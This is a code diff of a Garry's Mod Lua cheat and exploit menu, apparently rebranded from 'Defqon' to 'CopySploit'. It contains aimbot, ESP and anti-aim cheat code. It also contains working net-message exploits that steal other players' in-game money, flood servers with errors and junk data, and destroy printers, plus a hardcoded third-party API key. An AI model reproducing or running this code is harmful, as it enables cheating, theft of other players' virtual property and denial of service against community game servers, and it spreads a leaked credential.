-        Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight),
-        Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight),
-        Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight),
-    };
-    local flb = points[4]:ToScreen();
-    local brt = points[6]:ToScreen();
-    local blb = points[1]:ToScreen();
-    local frt = points[5]:ToScreen();
-    local frb = points[3]:ToScreen();
-    local brb = points[2]:ToScreen();
-    local blt = points[7]:ToScreen();
-    local flt = points[8]:ToScreen();
-    local arr = { flb, brt, blb, frt, frb, brb, blt, flt };
-
-    local t1 = flb.x;
-    local t2 = flb.y;
-    local t3 = flb.x;
-    local t4 = flb.y;
-
-    for i=1,8 do
-        if (t1 > arr[i].x) then
-            t1 = arr[i].x;
-        end
-        if (t4 < arr[i].y) then
-            t4 = arr[i].y;
-        end
-        if (t3 < arr[i].x) then
-            t3 = arr[i].x;
-        end
-        if (t2 > arr[i].y) then
-            t2 = arr[i].y;
-        end
-    end
-    return t1,t3,t2,t4;
-end
-function pMenu.PredictPos(pos)
-    local myvel = LocalPlayer():GetVelocity()
-    local pos = pos - (myvel * engine.TickInterval());
-    return pos;
-end
-function pMenu.SmoothAngle(angle,me,SmoothPercent)
-    local first = Vector(angle.x - me.x, math.NormalizeAngle(angle.y - me.y), 0.0);
-    local smoothX = me.x + first.x / 100 * SmoothPercent;
-    local smoothY = me.y + first.y / 100 * SmoothPercent;
-    return Angle(smoothX, math.NormalizeAngle(smoothY), 0.0);
-end
-function pMenu.GetAngle(src, dst)
-    local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
-    local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
-    local pitch = math.atan(delta.z/hyp) * Rad * -1;
-    local yaw = math.atan(delta.y / delta.x) * Rad;
-    if (delta.x >= 0) then
-        yaw = yaw + 180;
-    end
-    return Angle(pitch, math.NormalizeAngle(yaw - 180), 0.0);
-end
-function pMenu.GetAngleVector(src, dst)
-    local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
-    local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
-    local pitch = math.atan(delta.z/hyp) * Rad * -1;
-    local yaw = math.atan(delta.y / delta.x) * Rad;
-    if (delta.x >= 0) then
-        yaw = yaw + 180;
-    end
-    return Vector(pitch, math.NormalizeAngle(yaw - 180), 0.0);
-end
-function pMenu.ClosestEntToCross(limit,pcmd,bonee,Angle)
-    if limit == nil then
-        limit = 360;
-    end
-    local curAng = Vector(Angle.x,Angle.y + 180,0);
-    local curEye = LocalPlayer():EyePos()
-    local ret = NULL
-    local retDist = 1000;
-    for k,v in pairs(player.GetAll()) do
-        if v == LocalPlayer() || !v:Alive() then
-            continue;
-        end
-        local pos = Vector(0,0,0);
-        if bonee != nil then
-            pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(bonee)))
-        else
-            pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone)))
-        end
-        local tarAng = pMenu.GetAngleVector(curEye,pos);
-        tarAng = Vector(tarAng.x,tarAng.y + 180,0);
-        local dist = tarAng:Distance(curAng);
-        if dist <= limit && dist < retDist && LocalPlayer():IsLineOfSightClear(pos) then
-            ret = v;
-            retDist = dist;
-        end
-    end
-    return ret;
-end
-function pMenu.AAA(ply)
-    local Angles = ply:EyeAngles()
-    if pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"] != nil && pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"].value then
-        Angles.p = math.NormalizeAngle( math.Clamp(Angles.p,-89,89) + pMenuVars.Sliders[ply:SteamID().."Force Pitch"].value)
-        Angles.y = math.NormalizeAngle( math.NormalizeAngle(Angles.y) + pMenuVars.Sliders[ply:SteamID().."Force Yaw"].value)
-    end
-    ply:SetPoseParameter("aim_pitch", Angles.p);
-    ply:SetPoseParameter("body_yaw", Angles.y);
-    ply:SetPoseParameter("aim_yaw", 0);
-    ply:InvalidateBoneCache();
-    ply:SetRenderAngles(Angle(0, Angles.y, 0));
-end
-hook.Add("RenderScene","tes",function()
-    for k,v in pairs(player.GetAll()) do
-        if v == LocalPlayer() then
-            continue;
-        end
-        pMenu.AAA(v)
-    end
-end)
-function pMenu.DrawESP(ply)
-    local boxcolor = Color(pMenuVars.Sliders["ESP BoxColor.r"].value,pMenuVars.Sliders["ESP BoxColor.g"].value,pMenuVars.Sliders["ESP BoxColor.b"].value,255)
-    local textcolor = Color(pMenuVars.Sliders["ESP TextColor.r"].value,pMenuVars.Sliders["ESP TextColor.g"].value,pMenuVars.Sliders["ESP TextColor.b"].value,255)
-    local left,right,top,bottom = pMenu.boundingbox(ply)
-    if pMenuVars.CheckBoxes["ESP BoundingBox"].value then
-        surface.SetDrawColor(boxcolor);
-        surface.DrawOutlinedRect(left + 1,top + 1, (right - left) + 1,(bottom - top) + 1)
-    end
-    if pMenuVars.CheckBoxes["ESP HealthBar"].value then
-        surface.SetDrawColor(0,0,0,255);
-        surface.DrawRect(left - 5,top - 1 + 2,4, (bottom - top) / 100 * ply:Health() + 2)
-        surface.SetDrawColor(255,0,0,255);
-        surface.DrawRect(left - 4,top + 2,2, (bottom - top) / 100 * ply:Health())
-    end
-
-    if (pMenuVars.CheckBoxes["ESP Name"].value) then
-        draw.SimpleText(ply:Nick(),"Font L2",left + (right - left) / 2,top - 5,textcolor,TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
-    end
-    if (pMenuVars.CheckBoxes["ESP Position"].value) then
-        local pos = ply:GetPos();
-        draw.SimpleText("POS = ".."X: "..math.floor(pos.x).." Y: "..math.floor(pos.y).." Z: "..math.floor(pos.z),"Font L2",right + 3,top,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
-    end
-    if (pMenuVars.CheckBoxes["ESP Angles"].value) then
-        local pos = ply:EyeAngles();
-        draw.SimpleText("ANG.X: "..(ply:EyeAngles().p),"Font L2",right + 3,top + 12,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
-        draw.SimpleText("ANG.Y: "..(ply:EyeAngles().y),"Font L2",right + 3,top + 24,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
-        draw.SimpleText("ANG.Z: "..(ply:EyeAngles().r),"Font L2",right + 3,top + 36,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
-    end
-    if (pMenuVars.CheckBoxes["ESP Traceline"].value) then
-        local eyes = (ply:EyePos() + ply:EyeAngles():Forward() * pMenuVars.Sliders["ESP Traceline Distance"].value):ToScreen();
-        local eye = ply:EyePos():ToScreen();
-
-        surface.SetDrawColor(255,255,255,255)
-        if eye.visible && eyes.visible then
-            surface.DrawLine(eyes.x,eyes.y,eye.x,eye.y)
-        end
-    end
-end
-// pasted chams because l a z y
-local chamsmat = CreateMaterial("a", "VertexLitGeneric", {
-    ["$ignorez"] = 1,
-    ["$model"] = 1,
-    ["$basetexture"] = "models/debug/debugwhite",
-})
-local chamsmat2 = CreateMaterial("@", "VertexLitGeneric", {
-    ["$ignorez"] = 0,
-    ["$model"] = 1,
-    ["$basetexture"] = "models/debug/debugwhite",
-})
-function pMenu.Chams(v)
-    local ChamVis = Color(pMenuVars.Sliders["ESP ChamVisColor.r"].value,pMenuVars.Sliders["ESP ChamVisColor.g"].value,pMenuVars.Sliders["ESP ChamVisColor.b"].value,255)
-    local ChamNVis = Color(pMenuVars.Sliders["ESP ChamNVisColor.r"].value,pMenuVars.Sliders["ESP ChamNVisColor.g"].value,pMenuVars.Sliders["ESP ChamNVisColor.b"].value,255)
-    cam.Start3D()
-        if v:IsValid() then
-            if pMenuVars.CheckBoxes["ESP XQZ"].value then
-                render.MaterialOverride(chamsmat)
-                render.SetColorModulation(ChamNVis.r/ 255, ChamNVis.g/255, ChamNVis.b/255)
-                v:DrawModel()
-            end
-
-            render.SetColorModulation(ChamVis.r / 255, ChamVis.g/ 255, ChamVis.b/ 255)--vis
-            render.MaterialOverride(chamsmat2)
-            v:DrawModel()
-        end
-        local wep = v:GetActiveWeapon()
-        local wep = v:GetActiveWeapon()
-        if wep:IsValid() then
-            if pMenuVars.CheckBoxes["ESP WeaponCham"].value then
-                render.MaterialOverride(chamsmat)
-                render.SetColorModulation(255/255, 0/255, 0/255, 255)
-                wep:DrawModel()
-                render.SetColorModulation(255/255, 255/255, 0/255, 255)
-                render.MaterialOverride(chamsmat2)
-                wep:DrawModel()
-            end
-        end
-    cam.End3D()
-end
-function pMenu.bhop(pcmd)
-    if (!LocalPlayer():IsOnGround() && !LocalPlayer():IsTyping() && pcmd:KeyDown(IN_JUMP)) then
-        pcmd:RemoveKey(IN_JUMP)
-    end
-end
-function pMenu.autostrafe(pcmd)
-    if !(LocalPlayer():IsOnGround()) && input.IsKeyDown(KEY_SPACE) then
-        if(pcmd:GetMouseX() > 1 or pcmd:GetMouseX() < -1) then
-            if(pcmd:GetMouseX() < 0) then
-                pcmd:SetSideMove(-400)
-            else
-                pcmd:SetSideMove(400)
-            end
-        else
-            pcmd:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
-            pcmd:SetSideMove((pcmd:CommandNumber() % 2 == 0) and 400 or -400)
-        end
-    end
-end
-function pMenu.ToggleMenu()
-    if Frame == NULL then
-        pMenu.Menu()
-    else
-        Frame:Close()
-        Frame = NULL
-    end
-end
-function pMenu.FixMovement(pCmd,fa,angles)
-    local vec = Vector(pCmd:GetForwardMove(pCmd), pCmd:GetSideMove(), 0)
-    local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
-    local mang = vec:Angle()
-    local yaw = angles.y - fa.y + mang.y
-    if (((angles.p+90)%360) > 180) then
-        yaw = 180 - yaw
-    end
-    yaw = ((yaw + 180)%360)-180
-    pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
-    pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
-end
-function pMenu.Shoot(pcmd)
-    if(LocalPlayer():KeyDown(1)) then
-        pcmd:SetButtons(bit.band( pcmd:GetButtons(), bit.bnot( 1 ) ) );
-    else
-        pcmd:SetButtons(bit.bor( pcmd:GetButtons(), 1 ) );
-    end
-end
-hook.Add("RenderScreenspaceEffects","hkRenderScreenspaceEffects",function()
-    if (pMenuVars.CheckBoxes["ESP Chams"] != nil && pMenuVars.CheckBoxes["ESP Chams"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
-        for k,v in pairs(player.GetAll()) do
-            if v != LocalPlayer() && v:Alive() && !v:IsDormant() && v:Health() > 1 then
-                pMenu.Chams(v);
-            end
-        end
-    end
-end)
-
-hook.Add("PreDrawHalos","hkPreDrawHalos",function()
-    if (pMenuVars.CheckBoxes["ESP Glow"] != nil && pMenuVars.CheckBoxes["ESP Glow"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
-        local tab = {}
-        for k,v in pairs(player.GetAll()) do
-            if v != LocalPlayer() &&  v:Alive() then
-                tab[k] = v;
-            end
-        end
-        halo.Add( tab, Color( 255, 255, 255 ), 2, 2, 4,true,true )
-    end
-end)
-hook.Add("HUDPaint","hkHUDPaint",function()
-	if pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value then
-    for k,v in pairs(player.GetAll()) do
-        if v != LocalPlayer() then
-					if v:Alive() then
-              pMenu.DrawESP(v)
-					end
-        end
-    end
-	end
-    if pMenuVars.CheckBoxes["Aibmot Show fov circle"] != nil && pMenuVars.CheckBoxes["Aibmot Show fov circle"].value then
-        local End = (ScrW() / (LocalPlayer():GetFOV() + 60) ) * pMenuVars.Sliders["Aimbot FOV"].value;
-        pMenu.DrawCircle(ScrW() / 2,ScrH() / 2, End, 70,Color(pMenuVars.Sliders["Aimbot Circle.r"].value,pMenuVars.Sliders["Aimbot Circle.g"].value,pMenuVars.Sliders["Aimbot Circle.b"].value,pMenuVars.Sliders["Aimbot Circle.a"].value))
-    end
-end)
-local View = Angle();
-hook.Add("CalcView","hkCalcView",function(ply, pos1, angles, fov)
-    if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
-        local view = {}
-        local ang = View
-        view.angles = View
-        local angfwd = ang:Forward();
-        local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
-        local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
-        local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})
-
-        view.origin = tracelines.HitPos
-        view.drawviewer = true;
-        return view;
-    end
-    if pMenuVars.CheckBoxes["MISC Thirdperson"] != nil && pMenuVars.CheckBoxes["MISC Thirdperson"].value then
-        local view = {}
-        local ang = angles
-        view.angles = ang
-        local angfwd = ang:Forward();
-        local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
-        local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
-        local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})
-
-        view.origin = tracelines.HitPos
-        view.drawviewer = true;
-        return view;
-    end
-end)
-local t = 0;
-local jitter = false;
-local AShoot = false;
-hook.Add("CreateMove","hkCreateMove",function(pCmd)
-    if pMenuVars.CheckBoxes["MISC Bhop"] != nil && pMenuVars.CheckBoxes["MISC Bhop"].value then
-        pMenu.bhop(pCmd)
-    end
-    if pMenuVars.CheckBoxes["MISC Autostrafe"] != nil && pMenuVars.CheckBoxes["MISC Autostrafe"].value then
-        pMenu.autostrafe(pCmd)
-    end
-    if pMenuVars.CheckBoxes["Aibmot Enable"] != nil && pMenuVars.CheckBoxes["Aibmot Enable"].value then
-        if input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value) then
-            local nearest = pMenu.ClosestEntToCross(pMenuVars.Sliders["Aimbot FOV"].value,pCmd,AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone,pCmd:GetViewAngles());
-            if nearest != NULL then
-                local Eye = LocalPlayer():EyePos();
-                local target = nearest:GetBonePosition(nearest:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone))
-                local End = Angle();
-                if pMenuVars.CheckBoxes["Aibmot Smooth"].value then
-                    End = pMenu.SmoothAngle(pMenu.GetAngle(Eye,target),pCmd:GetViewAngles(),pMenuVars.Sliders["Aimbot Smooth AMT"].value);
-                else
-                    End = pMenu.GetAngle(Eye,target)
-                end
-                pCmd:SetViewAngles(End)
-            end
-        end
-    end
-    if input.IsKeyDown(KEY_DELETE) then
-        t = t + 1
-        if t == 1 then
-            pMenu.ToggleMenu()
-        end
-    else
-        t = 0;
-    end
-    local fwdmouse = Vector(pCmd:GetMouseX(),pCmd:GetMouseY(),0)
-    View.y = math.NormalizeAngle(View.y + ( ((fwdmouse.x / 250) * GetConVar("sensitivity"):GetInt() )* -1) );
-    View.x = math.Clamp(View.x + ( ((fwdmouse.y / 250) * GetConVar("sensitivity"):GetInt() )),-89,89 );
-    View:Normalize()
-    if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
-        local CurAngles = pCmd:GetViewAngles()
-        local Anglez = Angle(View.x,View.y,0);
-        if (pMenuVars.CheckBoxes["HvH Antiaim"].value) then
-            Anglez = Angle(pMenuVars.Sliders["HvH Pitch"].value,pMenuVars.Sliders["HvH Yaw"].value,0);
-            local style = pMenuVars.Sliders["HvH Style"].value;
-            if style == 1 then
-                jitter = !jitter;
-                if jitter then
-                    Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 100);
-                else
-                    Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 10);
-                end
-            elseif style == 2 then
-                Anglez.y = math.NormalizeAngle(CurAngles.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value));
-            elseif style == 3 then
-                local rand = pMenuVars.Sliders["HvH randomY"].value;
-                Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + math.random(rand * -1,rand));
-            elseif style == 4 then
-                local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View)
-                if ent == NULL then
-                    Anglez.y = math.NormalizeAngle(Anglez.y + View.y);
-                else
-                    local poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
-                    local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
-                    Anglez.y = math.NormalizeAngle(End.y + Anglez.y);
-                end
-            elseif style == 5 then
-                Anglez.y = math.NormalizeAngle(Anglez.y);
-            elseif style == 6 then
-                Anglez.y = math.NormalizeAngle(View.y + Anglez.y);
-            end
-        end
-        if pMenuVars.CheckBoxes["HvH Autoshoot"].value || input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value)  then
-            AShoot = !AShoot;
-            if AShoot then
-                local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View);
-                if ent != NULL then
-                    local poz = Vector(0,0,0);
-                    if pMenuVars.CheckBoxes[ent:SteamID().."Baim"] != nil && pMenuVars.CheckBoxes[ent:SteamID().."Baim"].value then
-                        local center = ent:OBBCenter()
-                        poz = ent:GetPos() + center;
-                    else
-                        poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
-                    end
-                    local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
-                    Anglez.x = math.Clamp(End.x,-89,89)
-                    Anglez.y = math.NormalizeAngle(End.y);
-                    pMenu.Shoot(pCmd)
-                end
-            end
-        end
-        if Anglez != nil then
-            pCmd:SetViewAngles(Anglez)
-        end
-        pMenu.FixMovement(pCmd,View,pCmd:GetViewAngles())
-    end
-end)
-hook.Add( "OnPlayerChat", "hkOnPlayerChat", function( ply, strText, bTeam, bDead )
-    if pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"] != nil && pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"].value then
-        strText = string.lower( strText )
-        local player = ply:Nick()
-
-        local text = player.." said "..strText;
-        sound.PlayURL("https://api.ispeech.org/api/rest?apikey=34b06ef0ba220c09a817fe7924575123&action=convert&voice=usenglishmale&speed=1&pitch=100&text="..text,"mono",function(snd)
-            if IsValid(snd) then
-                snd:Play()
-                snd:SetVolume(1)
-            end
-        end)
-    end
-end)
-concommand.Add("Defqon_bigmenu",pMenu.ToggleMenu)
-
-//////////////////////////////////////////////////////////////////////////////////
-// Got bored ended up getting this far in like 4 ish hours I cant type fast :\ //
-//////////////////////////////////////////////////////////////////////////////////
-
-
+]]--
 /*
 
  CreateClientConVar( "gravko_esp", "0", true, true)
@@ -1359,7 +448,7 @@ end)
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 local ulxflood = false
 local netKey = ""
-local Defqon = nil
+local CopySploit = nil
 if ulx then ulx.showMotdMenu = function() end end
 local iZNX = {}
 iZNX.memory = {}
@@ -1367,14 +456,6 @@ local grad = Material( "gui/gradient" )
 local upgrad = Material( "gui/gradient_up" )
 local downgrad = Material( "gui/gradient_down" )
 local ctext = chat.AddText
-surface.CreateFont("HUDLogo2",{size = 18, weight = 100, antialias = 0})
-
-timer.Create("timerversionchecker",20,1,function()
-hook.Remove("HUDPaint", "HudVersionChecker")
-end)
-hook.Add("HUDPaint", "HudVersionChecker", function()
-draw.SimpleTextOutlined( "Привет "..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", вы используете последнюю версию меню", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/30, Color( 99, 210, 214, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
-end)
 function playSound(url)
 
     sound.PlayURL(url, '', function( station )
@@ -1389,23 +470,11 @@ function playSound(url)
 
 end
 playSound("")
-function luaview()
-surface.PlaySound("garrysmod/ui_click.wav")
-iZNX.Menu:Remove()
-vgui.Create("chmluaviewer"):MakePopup()
-end
-concommand.Add("Defqon_luaview", function() vgui.Create("chmluaviewer"):MakePopup() end)
-
-function bigmenu()
-surface.PlaySound("garrysmod/ui_click.wav")
-iZNX.Menu:Remove()
-RunConsoleCommand( "Defqon_bigmenu" )
-end
 
 function anticheats()
 surface.PlaySound("garrysmod/ui_click.wav")
 iZNX.Menu:Remove()
-RunConsoleCommand( "Defqon_anticheats")
+RunConsoleCommand( "CopySploit_anticheats")
 end
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 		function editor()
@@ -1715,12 +784,12 @@ surface.PlaySound("garrysmod/ui_click.wav")
 gui.OpenURL( "http://discord.gg/weJb7TJ" )
 end
 function iZNX.ChatText( str )
-ctext( Color(190, 190, 190), [[ [DefqonSploit v5.1.1]: ]]..str )
+ctext( Color(190, 190, 190), [[ [CopySploit]: ]]..str )
 end
 function iZNX.NetStart( str )
 local netstart = net.Start
-if Defqon and Defqon.G and Defqon.G.net then
-netstart = Defqon.G.net.Start
+if CopySploit and CopySploit.G and CopySploit.G.net then
+netstart = CopySploit.G.net.Start
 else
 --        print( "sending netmessage in insecure mode" )
 end
@@ -1728,8 +797,8 @@ return netstart( str )
 end
 function iZNX.ValidNetString( str )
 local netstart = net.Start
-if Defqon and Defqon.G and Defqon.G.net then
-netstart = Defqon.G.net.Start
+if CopySploit and CopySploit.G and CopySploit.G.net then
+netstart = CopySploit.G.net.Start
 else
 --        print( "scanning for exploit in insecure mode" )
 end
@@ -2106,9 +1175,9 @@ scan = function() return iZNX.ValidNetString( "SyncPrinterButtons16690" ) end,
 functions = {
 { typ = "func", name = "Тык", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_money" ) then
+if !timer.Exists( "CopySploit_exploit_money" ) then
 iZNX.ChatText( "Воруем чужие деньги" )
-timer.Create( "Defqon_exploit_money", 0.1, 0, function()
+timer.Create( "CopySploit_exploit_money", 0.1, 0, function()
 for k, v in pairs(ents.GetAll()) do
 if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
 iZNX.NetStart( "SyncPrinterButtons16690" )
@@ -2119,7 +1188,7 @@ end
 end
 end)
 else
-timer.Remove( "Defqon_exploit_money" )
+timer.Remove( "CopySploit_exploit_money" )
 iZNX.ChatText( "Прекращаем воровать" )
 end
 end, },
@@ -2339,9 +1408,9 @@ scan = function() return iZNX.ValidNetString( "SyncPrinterButtons765611980561716
 functions = {
 { typ = "func", name = "Тык", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_shekels" ) then
+if !timer.Exists( "CopySploit_exploit_shekels" ) then
 iZNX.ChatText( "Воруем чужие деньги" )
-timer.Create( "Defqon_exploit_shekels", 0.1, 0, function()
+timer.Create( "CopySploit_exploit_shekels", 0.1, 0, function()
 for k, v in pairs(ents.GetAll()) do
 if( v:GetClass():find("print") ) then
 iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
@@ -2352,7 +1421,7 @@ end
 end
 end)
 else
-timer.Remove( "Defqon_exploit_shekels" )
+timer.Remove( "CopySploit_exploit_shekels" )
 iZNX.ChatText( "Прекращаем воровать" )
 end
 end, },
@@ -2397,15 +1466,15 @@ scan = function() return iZNX.ValidNetString( "steamid2" ) end,
 functions = {
 { typ = "func", name = "Big Spam", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_errorz" ) then
+if !timer.Exists( "CopySploit_exploit_errorz" ) then
 iZNX.ChatText( "Error спам запущен" )
-timer.Create( "Defqon_exploit_errorz", 0.1, 0, function()
+timer.Create( "CopySploit_exploit_errorz", 0.1, 0, function()
 iZNX.NetStart( "steamid2" )
 net.WriteString( "Something is creating very strong script errors" )
 net.SendToServer()
 end)
 else
-timer.Remove( "Defqon_exploit_errorz" )
+timer.Remove( "CopySploit_exploit_errorz" )
 iZNX.ChatText( "Error спам остановлен" )
 end
 end, },
@@ -2418,9 +1487,9 @@ scan = function() return iZNX.ValidNetString( "steamid2" ) end,
 functions = {
 { typ = "func", name = "Big Spam", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_errorzt" ) then
+if !timer.Exists( "CopySploit_exploit_errorzt" ) then
 iZNX.ChatText( "Error спам запущен" )
-timer.Create( "Defqon_exploit_errorzt", 0, 0, function()
+timer.Create( "CopySploit_exploit_errorzt", 0, 0, function()
 for i = 1, 100 do
 iZNX.NetStart( "steamid2" )
 net.WriteString( "Something is creating very strong script errors" )
@@ -2428,7 +1497,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_errorzt" )
+timer.Remove( "CopySploit_exploit_errorzt" )
 iZNX.ChatText( "Error спам остановлен" )
 end
 end, },
@@ -2441,9 +1510,9 @@ scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
 functions = {
 { typ = "func", name = "Запуск", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_selldrugon" ) then
+if !timer.Exists( "CopySploit_exploit_selldrugon" ) then
 iZNX.ChatText( "Exploit запущен" )
-timer.Create( "Defqon_exploit_selldrugon", 0, 0, function()
+timer.Create( "CopySploit_exploit_selldrugon", 0, 0, function()
 for i=1,1000 do
 iZNX.NetStart("Kun_SellDrug")
 net.WriteString("mushroom")
@@ -2451,7 +1520,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_selldrugon" )
+timer.Remove( "CopySploit_exploit_selldrugon" )
 iZNX.ChatText( "Exploit остановлен" )
 end
 end, },
@@ -2786,15 +1855,15 @@ scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
 functions = {
 { typ = "func", name = "Запуск", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_datatrasher" ) then
+if !timer.Exists( "CopySploit_exploit_datatrasher" ) then
 iZNX.ChatText( "Запуск спама в данные сервера" )
-timer.Create( "Defqon_exploit_datatrasher", 0.5, 0, function()
+timer.Create( "CopySploit_exploit_datatrasher", 0.5, 0, function()
 iZNX.NetStart( "WriteQuery" )
 net.WriteString( "LOL" )
 net.SendToServer()
 end)
 else
-timer.Remove( "Defqon_exploit_datatrasher" )
+timer.Remove( "CopySploit_exploit_datatrasher" )
 iZNX.ChatText( "Прекращение спама" )
 end
 end, },
@@ -2805,7 +1874,7 @@ desc = "Большой спам, очень скучный",
 severity = 1337,
 scan = function() return iZNX.ValidNetString( "VJSay" ) end,
 functions = {
-{ typ = "string", name = "Введите сообщение", default = "DefqonMenu", addr = "vj_string" },
+{ typ = "string", name = "Введите сообщение", default = "CopySploitMenu", addr = "vj_string" },
 { typ = "func", name = "Начать", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
 iZNX.ChatText("Broadcasting")
@@ -3733,9 +2802,9 @@ end
 end, },
 { typ = "func", name = "Spam выдача", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_spamdahitprendre" ) then
+if !timer.Exists( "CopySploit_exploit_spamdahitprendre" ) then
 iZNX.ChatText( "Spam запущен" )
-timer.Create( "Defqon_exploit_spamdahitprendre", 1, 0, function()
+timer.Create( "CopySploit_exploit_spamdahitprendre", 1, 0, function()
 local t = iZNX.GetStored( "l_players_listdahit", {} )
 for k, v in pairs( player.GetAll() ) do
 if !table.HasValue( t, v ) then continue end
@@ -3749,15 +2818,15 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_spamdahitprendre" )
+timer.Remove( "CopySploit_exploit_spamdahitprendre" )
 iZNX.ChatText( "Spam прекращен" )
 end
 end, },
 { typ = "func", name = "Spam забиранием", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_spamdahitenlever" ) then
+if !timer.Exists( "CopySploit_exploit_spamdahitenlever" ) then
 iZNX.ChatText( "Spam запущен" )
-timer.Create( "Defqon_exploit_spamdahitenlever", 1, 0, function()
+timer.Create( "CopySploit_exploit_spamdahitenlever", 1, 0, function()
 local t = iZNX.GetStored( "l_players_listdahit", {} )
 for k, v in pairs( player.GetAll() ) do
 if !table.HasValue( t, v ) then continue end
@@ -3771,7 +2840,7 @@ net.SendToServer()
 end
 end)
 else
-timer.Remove( "Defqon_exploit_spamdahitenlever" )
+timer.Remove( "CopySploit_exploit_spamdahitenlever" )
 iZNX.ChatText( "Spam прекращен" )
 end
 end, },
@@ -3784,9 +2853,9 @@ scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
 functions = {
 { typ = "func", name = "Запуск", func = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-if !timer.Exists( "Defqon_exploit_printersmasher" ) then
+if !timer.Exists( "CopySploit_exploit_printersmasher" ) then
 iZNX.ChatText( "Anti-Printer запущен" )
-timer.Create( "Defqon_exploit_printersmasher", 0, 0, function()
+timer.Create( "CopySploit_exploit_printersmasher", 0, 0, function()
 for k, v in pairs( ents.GetAll() ) do
 if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
 iZNX.NetStart("customprinter_get")
@@ -3797,7 +2866,7 @@ end
 end
 end)
 else
-timer.Remove( "Defqon_exploit_printersmasher" )
+timer.Remove( "CopySploit_exploit_printersmasher" )
 iZNX.ChatText( "Anti-Printer остановлен" )
 end
 end, },
